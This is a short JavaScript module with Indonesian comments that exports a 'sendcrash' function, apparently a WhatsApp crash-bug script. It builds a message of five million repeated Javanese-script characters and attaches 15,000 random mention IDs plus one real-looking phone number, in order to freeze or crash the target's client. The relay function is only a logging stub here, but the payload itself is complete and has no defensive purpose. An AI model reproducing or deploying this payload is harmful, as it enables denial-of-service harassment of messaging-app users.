const aorbugz = {
    relayMessage: async (target, message, options) => {
        console.log(`Mengirim pesan ke: ${target}`);
        console.log(`Pesan: ${message.extendedTextMessage.text}`);
        return Promise.resolve();
    }
};

async function sendcrash(target, Ptcp = false) {
    const crashText = "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "ꦾ".repeat(5000000); // Teks berat
    const mentionedJid = [
        "6281991410940@s.whatsapp.net",
        ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) // Daftar mention
    ];

    await aorbugz.relayMessage(target, {
        extendedTextMessage: {
            text: crashText,
            contextInfo: {
                mentionedJid: mentionedJid,
                stanzaId: "1234567890ABCDEF",
                participant: "0@s.whatsapp.net",
            }
        }
    }, Ptcp ? { participant: { jid: target } } : {});
}

module.exports = sendcrash;
